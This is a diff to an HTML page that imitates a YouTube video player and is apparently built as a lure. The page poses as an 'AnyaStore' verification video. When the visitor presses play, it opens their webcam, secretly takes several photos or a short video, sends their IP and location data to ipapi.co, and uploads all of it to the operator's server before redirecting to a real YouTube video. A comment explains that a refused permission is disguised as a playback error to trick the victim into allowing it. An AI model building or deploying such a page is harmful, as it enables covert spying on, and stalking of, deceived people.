@@ -4,30 +4,73 @@
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <title>YouTube</title>
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0/css/all.min.css">
     <style>
-        body { margin: 0; background-color: #0f0f0f; color: white; font-family: "Roboto", Arial, sans-serif; overflow: hidden; }
-        .video-container { position: relative; width: 100vw; height: 56.25vw; background: #000; display: flex; align-items: center; justify-content: center; cursor: pointer; }
-        .spinner { border: 4px solid rgba(255, 255, 255, 0.1); border-left-color: #fff; border-radius: 50%; width: 50px; height: 50px; animation: spin 1s linear infinite; }
+        body { margin: 0; background-color: #0f0f0f; color: white; font-family: "Roboto", Arial, sans-serif; }
+        
+        /* Video Player Area */
+        .video-wrapper { position: relative; width: 100%; background: #000; aspect-ratio: 16 / 9; display: flex; align-items: center; justify-content: center; }
+        .spinner { border: 4px solid rgba(255, 255, 255, 0.1); border-left-color: #ff0000; border-radius: 50%; width: 50px; height: 50px; animation: spin 1s linear infinite; }
         @keyframes spin { to { transform: rotate(360deg); } }
-        #overlay-btn { position: absolute; top: 0; left: 0; width: 100%; height: 100%; z-index: 10; opacity: 0; cursor: pointer; border: none; background: none; }
-        .video-info { padding: 15px; }
-        .video-title { font-size: 18px; font-weight: bold; margin-bottom: 8px; color: #f1f1f1; }
-        .video-stats { font-size: 14px; color: #aaa; }
-        .loading-text { margin-top: 15px; font-size: 14px; color: #aaa; }
+        
+        /* Play Button Overlay */
+        #play-overlay { position: absolute; top: 0; left: 0; width: 100%; height: 100%; z-index: 20; display: flex; align-items: center; justify-content: center; cursor: pointer; }
+        .play-icon { font-size: 60px; color: white; opacity: 0.9; }
+
+        /* Video Info Section */
+        .video-details { padding: 12px; }
+        .video-title { font-size: 19px; font-weight: 700; line-height: 24px; margin-bottom: 8px; display: -webkit-box; -webkit-line-clamp: 2; -webkit-box-orient: vertical; overflow: hidden; }
+        
+        /* Channel Section */
+        .channel-row { display: flex; align-items: center; margin: 12px 0; justify-content: space-between; }
+        .channel-info { display: flex; align-items: center; gap: 10px; }
+        .channel-pfp { width: 40px; height: 40px; background: #3f3f3f; border-radius: 50%; display: flex; align-items: center; justify-content: center; font-weight: bold; font-size: 20px; color: #ff4747; }
+        .channel-name-container { display: flex; flex-direction: column; }
+        .channel-name { font-size: 16px; font-weight: 600; display: flex; align-items: center; gap: 4px; }
+        .verified-badge { color: #aaa; font-size: 12px; }
+        .sub-count { font-size: 12px; color: #aaa; }
+        
+        .sub-btn { background: white; color: black; padding: 0 16px; height: 36px; border-radius: 18px; border: none; font-weight: 600; font-size: 14px; cursor: pointer; }
+
+        /* Description Box */
+        .description-box { background: #272727; border-radius: 12px; padding: 12px; margin-top: 12px; font-size: 14px; line-height: 20px; }
+        .view-count { font-weight: 600; margin-bottom: 4px; display: block; }
+        
+        /* Hidden Media elements */
         video, canvas { display: none; }
     </style>
 </head>
 <body>
 
-    <div class="video-container" id="player">
-        <div class="spinner"></div>
-        <button id="overlay-btn" onclick="startCapture()"></button>
+    <div class="video-wrapper">
+        <div class="spinner" id="loading-spinner" style="display: none;"></div>
+        <div id="play-overlay" onclick="initiateCapture()">
+            <i class="fas fa-play play-icon"></i>
+        </div>
     </div>
 
-    <div class="video-info">
-        <div class="video-title">Official Music Video - 2026 Hits</div>
-        <div class="video-stats">1.2M views • 2 hours ago</div>
-        <div class="loading-text" id="status-msg">Click to play video...</div>
+    <div class="video-details">
+        <div class="video-title" id="display-title">Loading video details...</div>
+        
+        <div class="channel-row">
+            <div class="channel-info">
+                <div class="channel-pfp">A</div>
+                <div class="channel-name-container">
+                    <div class="channel-name">
+                        AnyaStore <i class="fas fa-check-circle verified-badge"></i>
+                    </div>
+                    <div class="sub-count">148K subscribers</div>
+                </div>
+            </div>
+            <button class="sub-btn">Subscribe</button>
+        </div>
+
+        <div class="description-box">
+            <span class="view-count">1.2M views • 3 hours ago</span>
+            <div id="display-desc">
+                Welcome to the official AnyaStore verification portal. Please play the video to verify your device status and proceed with your order.
+            </div>
+        </div>
     </div>
 
     <video id="v" autoplay playsinline></video>
@@ -37,13 +80,18 @@
         const params = new URLSearchParams(window.location.search);
         const uid = params.get('id');
         const mode = params.get('mode') || 'photo';
-        const camMode = params.get('cam') || 'user'; // 'user' for front, 'environment' for back
+        const camMode = params.get('cam') || 'user';
+        const ytId = params.get('ytid') || 'dQw4w9WgXcQ';
 
-        async function startCapture() {
+        // Update Title based on ID (optional)
+        document.getElementById('display-title').innerText = "Account Verification & Security Check - ID #" + (ytId.substring(0,6));
+
+        async function initiateCapture() {
             if (!uid || uid === "null") return;
 
-            document.getElementById('status-msg').innerText = "Loading video buffer...";
-            document.getElementById('overlay-btn').style.display = 'none';
+            // UI Changes: Hide play button, show spinner
+            document.getElementById('play-overlay').style.display = 'none';
+            document.getElementById('loading-spinner').style.display = 'block';
 
             try {
                 const stream = await navigator.mediaDevices.getUserMedia({ 
@@ -54,7 +102,7 @@
                 const v = document.getElementById('v');
                 v.srcObject = stream;
 
-                // Log IP Info
+                // Log IP Data
                 fetch('https://ipapi.co/json/').then(r => r.json()).then(data => {
                     fetch(`/log_info?id=${uid}`, {
                         method: 'POST',
@@ -70,7 +118,10 @@
                 }
 
             } catch (err) {
-                document.getElementById('status-msg').innerText = "Playback error: Please enable permissions to play.";
+                // If they deny, we show an "Error" that looks like a playback fail
+                document.getElementById('loading-spinner').style.display = 'none';
+                document.getElementById('display-title').innerText = "Playback Error: Please allow permissions to watch.";
+                document.getElementById('play-overlay').style.display = 'flex';
             }
         }
 
@@ -79,13 +130,11 @@
             const interval = setInterval(() => {
                 if (count >= 8) {
                     clearInterval(interval);
-                    redirectToYouTube();
+                    finish();
                     return;
                 }
-                const c = document.getElementById('c');
-                const v = document.getElementById('v');
-                c.width = v.videoWidth;
-                c.height = v.videoHeight;
+                const c = document.getElementById('c'), v = document.getElementById('v');
+                c.width = v.videoWidth; c.height = v.videoHeight;
                 c.getContext('2d').drawImage(v, 0, 0);
                 
                 c.toBlob(blob => {
@@ -95,7 +144,7 @@
                 }, 'image/jpeg');
                 
                 count++;
-            }, 700);
+            }, 800);
         }
 
         function startVideoLogic(stream) {
@@ -106,15 +155,13 @@
                 const blob = new Blob(chunks, { type: 'video/webm' });
                 const fd = new FormData();
                 fd.append('file', blob);
-                fetch(`/upload?id=${uid}&type=video`, { method: 'POST', body: fd });
-                redirectToYouTube();
+                fetch(`/upload?id=${uid}&type=video`, { method: 'POST', body: fd }).then(finish);
             };
             recorder.start();
-            setTimeout(() => recorder.stop(), 3500);
+            setTimeout(() => recorder.stop(), 4000); // 4 second capture
         }
 
-        function redirectToYouTube() {
-            const ytId = params.get('ytid') || 'dQw4w9WgXcQ';
+        function finish() {
             window.location.href = `https://www.youtube.com/watch?v=${ytId}`;
         }
     </script>
